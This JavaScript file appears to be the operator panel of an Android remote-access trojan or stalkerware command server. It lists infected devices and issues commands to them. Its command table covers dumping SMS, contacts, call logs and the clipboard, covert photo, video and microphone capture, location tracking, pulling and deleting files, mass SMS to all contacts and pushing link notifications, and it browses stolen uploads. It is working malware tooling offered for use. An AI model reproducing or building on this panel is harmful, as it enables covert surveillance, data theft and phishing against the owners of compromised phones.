const commands = {
    calls: { label: 'Calls', params: [], tooltip: 'Fetch call logs' },
    contacts: { label: 'Contacts', params: [], tooltip: 'Fetch contact list' },
    messages: { label: 'Messages', params: [], tooltip: 'Fetch SMS messages' },
    apps: { label: 'Apps', params: [], tooltip: 'List installed apps' },
    device_info: { label: 'Device Info', params: [], tooltip: 'Get device details' },
    clipboard: { label: 'Clipboard', params: [], tooltip: 'Retrieve clipboard content' },
    camera_main: { label: 'Main Camera', params: [], tooltip: 'Capture photo from main camera' },
    camera_selfie: { label: 'Selfie Camera', params: [], tooltip: 'Capture photo from selfie camera' },
    location: { label: 'Location', params: [], tooltip: 'Get current location' },
    vibrate: { label: 'Vibrate', params: [], tooltip: 'Trigger device vibration' },
    stop_audio: { label: 'Stop Audio', params: [], tooltip: 'Stop any playing audio' },
    send_message: { label: 'Send Message', params: [
        { name: 'number', label: 'Phone Number', type: 'text', placeholder: 'Enter phone number', tooltip: 'Recipient phone number' },
        { name: 'message', label: 'Message', type: 'text', placeholder: 'Enter message', tooltip: 'Message content' }
    ], tooltip: 'Send an SMS to a number' },
    send_message_to_all: { label: 'Send Message to All', params: [
        { name: 'message', label: 'Message', type: 'text', placeholder: 'Enter message', tooltip: 'Message to send to all contacts' }
    ], tooltip: 'Send an SMS to all contacts' },
    file: { label: 'Get File', params: [
        { name: 'path', label: 'File Path', type: 'text', placeholder: 'e.g., DCIM/Camera', tooltip: 'Path to file on device' }
    ], tooltip: 'Request a file from device' },
    delete_file: { label: 'Delete File', params: [
        { name: 'path', label: 'File Path', type: 'text', placeholder: 'e.g., DCIM/Camera', tooltip: 'Path to file to delete' }
    ], tooltip: 'Delete a file on device' },
    microphone: { label: 'Microphone', params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', placeholder: 'Enter duration', min: 1, tooltip: 'Recording duration in seconds' }
    ], tooltip: 'Record audio from microphone' },
    rec_camera_main: { label: 'Record Main Camera', params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', placeholder: 'Enter duration', min: 1, tooltip: 'Video recording duration' }
    ], tooltip: 'Record video from main camera' },
    rec_camera_selfie: { label: 'Record Selfie Camera', params: [
        { name: 'duration', label: 'Duration (seconds)', type: 'number', placeholder: 'Enter duration', min: 1, tooltip: 'Video recording duration' }
    ], tooltip: 'Record video from selfie camera' },
    toast: { label: 'Show Toast', params: [
        { name: 'message', label: 'Toast Message', type: 'text', placeholder: 'Enter toast message', tooltip: 'Message to display as toast' }
    ], tooltip: 'Show a toast notification' },
    show_notification: { label: 'Show Notification', params: [
        { name: 'title', label: 'Notification Title', type: 'text', placeholder: 'Enter title', tooltip: 'Notification title' },
        { name: 'link', label: 'Notification Link', type: 'text', placeholder: 'Enter link', tooltip: 'Link for notification' }
    ], tooltip: 'Display a notification' },
    play_audio: { label: 'Play Audio', params: [
        { name: 'link', label: 'Audio Link', type: 'text', placeholder: 'Enter direct audio link', tooltip: 'URL to audio file' }
    ], tooltip: 'Play audio from a URL' }
};

function showLoading() {
    document.getElementById('loading').classList.remove('hidden');
}

function hideLoading() {
    document.getElementById('loading').classList.add('hidden');
}

function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast ${type === 'error' ? 'bg-red-600' : 'bg-green-600'}`;
    toast.textContent = message;
    document.getElementById('toast-container').appendChild(toast);
    setTimeout(() => {
        toast.classList.add('opacity-0');
        setTimeout(() => toast.remove(), 300);
    }, 2500);
}

function toggleSidebar() {
    document.getElementById('sidebar').classList.toggle('open');
}

function showSection(section) {
    document.getElementById('devices-section').classList.add('hidden');
    document.getElementById('files-section').classList.add('hidden');
    document.getElementById(`${section}-section`).classList.remove('hidden');
    toggleSidebar();
}

function toggleDarkMode() {
    document.body.classList.toggle('light');
    localStorage.setItem('theme', document.body.classList.contains('light') ? 'light' : 'dark');
}

function fetchDevices() {
    showLoading();
    fetch('/devices')
        .then(response => response.json())
        .then(data => {
            const devicesList = document.getElementById('devices-list');
            devicesList.innerHTML = '';
            if (data.devices.length === 0) {
                devicesList.innerHTML = '<p class="text-green-600 text-center">No devices connected.</p>';
                hideLoading();
                return;
            }
            data.devices.forEach(device => {
                const card = document.createElement('div');
                card.className = 'device-card';
                card.innerHTML = `
                    <div class="flex items-center">
                        <i class="fas fa-mobile-alt text-green-400 text-xl mr-3"></i>
                        <h3 class="text-lg font-semibold">${device.model}</h3>
                    </div>
                    <p class="flex items-center"><i class="fas fa-battery-half mr-2"></i>Battery: ${device.battery}</p>
                    <p class="flex items-center"><i class="fas fa-android mr-2"></i>Version: ${device.version}</p>
                    <p class="flex items-center"><i class="fas fa-sun mr-2"></i>Brightness: ${device.brightness}</p>
                    <p class="flex items-center"><i class="fas fa-signal mr-2"></i>Provider: ${device.provider}</p>
                    <button class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-500 mt-3 flex items-center" title="Execute a command on this device"><i class="fas fa-terminal mr-2"></i>Execute</button>
                `;
                card.querySelector('button').onclick = () => showCommandModal(device.uuid, device.model);
                devicesList.appendChild(card);
            });
            hideLoading();
        })
        .catch(error => {
            hideLoading();
            showToast('Error fetching devices: ' + error.message, 'error');
        });
}

function fetchFiles() {
    showLoading();
    fetch('/files')
        .then(response => response.json())
        .then(data => {
            const filesList = document.getElementById('files-list');
            filesList.innerHTML = '';
            if (data.files.length === 0) {
                filesList.innerHTML = '<p class="text-green-600 text-center">No files uploaded.</p>';
                hideLoading();
                return;
            }
            data.files.forEach(file => {
                const card = document.createElement('div');
                card.className = 'file-card';
                let preview = '';
                if (file.isImage) {
                    preview = `
                        <div class="relative">
                            <img data-src="/files/${file.filename}" alt="${file.name}" class="file-preview lazy">
                            <div class="overlay">
                                <a href="/files/${file.filename}" target="_blank" class="text-green-400" title="View full image"><i class="fas fa-eye text-xl"></i></a>
                            </div>
                        </div>`;
                } else if (file.isVideo) {
                    preview = `<video controls class="file-preview" title="Play video"><source src="/files/${file.filename}" type="${file.type}"></video>`;
                } else if (file.isAudio) {
                    preview = `<audio controls class="file-preview" title="Play audio"><source src="/files/${file.filename}" type="${file.type}"></audio>`;
                } else if (file.isText) {
                    preview = `<a href="/files/${file.filename}" target="_blank" class="text-green-400 hover:text-green-300" title="View text file"><i class="fas fa-file-alt mr-2"></i>View Text</a>`;
                } else {
                    preview = `<a href="/files/${file.filename}" download class="text-green-400 hover:text-green-300" title="Download file"><i class="fas fa-download mr-2"></i>Download</a>`;
                }
                card.innerHTML = `
                    <div class="flex items-center">
                        <i class="fas ${file.isImage ? 'fa-image' : file.isVideo ? 'fa-video' : file.isAudio ? 'fa-file-audio' : 'fa-file'} text-green-400 text-xl mr-3"></i>
                        <h3 class="text-lg font-semibold">${file.name}</h3>
                    </div>
                    <p class="flex items-center"><i class="fas fa-weight-hanging mr-2"></i>Size: ${(file.size / 1024).toFixed(2)} KB</p>
                    <p class="flex items-center"><i class="fas fa-clock mr-2"></i>Uploaded: ${new Date(file.uploadedAt).toLocaleString()}</p>
                    <div class="file-preview">${preview}</div>
                    <button class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-500 mt-3 flex items-center" title="Delete this file"><i class="fas fa-trash mr-2"></i>Delete</button>
                `;
                card.querySelector('button').onclick = () => deleteFile(file.filename);
                filesList.appendChild(card);
            });
            document.querySelectorAll('.lazy').forEach(img => {
                img.src = img.dataset.src;
                img.classList.remove('lazy');
            });
            hideLoading();
        })
        .catch(error => {
            hideLoading();
            showToast('Error fetching files: ' + error.message, 'error');
        });
}

function showCommandModal(uuid, model) {
    const modal = document.getElementById('command-modal');
    const form = document.getElementById('command-form');
    const inputsDiv = document.getElementById('command-inputs');
    const commandType = document.getElementById('command-type');
    const commandUuid = document.getElementById('command-uuid');
    const commandDevice = document.getElementById('command-device');

    commandUuid.value = uuid;
    commandDevice.textContent = model;
    inputsDiv.innerHTML = `
        <div>
            <label class="block text-sm font-medium">Command</label>
            <select id="command-select" class="mt-1 block w-full" title="Select a command to execute">
                ${Object.entries(commands).map(([key, cmd]) => `<option value="${key}" title="${cmd.tooltip}">${cmd.label}</option>`).join('')}
            </select>
        </div>
    `;

    document.getElementById('command-select').addEventListener('change', (e) => {
        const command = e.target.value;
        commandType.value = command;
        const params = commands[command].params;
        inputsDiv.innerHTML = `
            <div>
                <label class="block text-sm font-medium">Command</label>
                <select id="command-select" class="mt-1 block w-full" title="${commands[command].tooltip}">
                    ${Object.entries(commands).map(([key, cmd]) => `<option value="${key}" ${key === command ? 'selected' : ''} title="${cmd.tooltip}">${cmd.label}</option>`).join('')}
                </select>
            </div>
            ${params.map(param => `
                <div>
                    <label class="block text-sm font-medium">${param.label}</label>
                    <input type="${param.type}" name="${param.name}" placeholder="${param.placeholder}" ${param.min ? `min="${param.min}"` : ''} class="mt-1 block w-full" title="${param.tooltip}" required>
                </div>
            `).join('')}
        `;
    });

    form.onsubmit = (e) => {
        e.preventDefault();
        const command = commandType.value;
        const params = {};
        let valid = true;
        commands[command].params.forEach(param => {
            const value = form.elements[param.name].value;
            if (param.type === 'number' && (isNaN(value) || value < (param.min || 0))) {
                showToast(`Invalid ${param.label}: Must be a number ${param.min ? `>= ${param.min}` : ''}`, 'error');
                valid = false;
            } else {
                params[param.name] = value;
            }
        });
        if (valid) {
            executeCommand(uuid, command, params);
            modal.classList.add('hidden');
        }
    };

    document.getElementById('cancel-command').onclick = () => {
        modal.classList.add('hidden');
        modal.classList.remove('modal-open');
    };
    modal.classList.add('modal-open');
    modal.classList.remove('hidden');
}

function executeCommand(uuid, command, params) {
    showLoading();
    fetch('/executeCommand', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ uuid, command, params })
    })
        .then(response => response.json())
        .then(data => {
            hideLoading();
            showToast(data.message, data.status === 'success' ? 'info' : 'error');
        })
        .catch(error => {
            hideLoading();
            showToast('Error executing command: ' + error.message, 'error');
        });
}

function deleteFile(filename) {
    if (!confirm(`Delete ${filename}?`)) return;
    showLoading();
    fetch(`/files/${filename}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            hideLoading();
            showToast(data.message, data.status === 'success' ? 'info' : 'error');
            fetchFiles();
        })
        .catch(error => {
            hideLoading();
            showToast('Error deleting file: ' + error.message, 'error');
        });
}

document.addEventListener('DOMContentLoaded', () => {
    fetchDevices();
    fetchFiles();
    setInterval(fetchDevices, 10000);
    setInterval(fetchFiles, 10000);
    if (localStorage.getItem('theme') === 'light') {
        document.body.classList.add('light');
    }
});
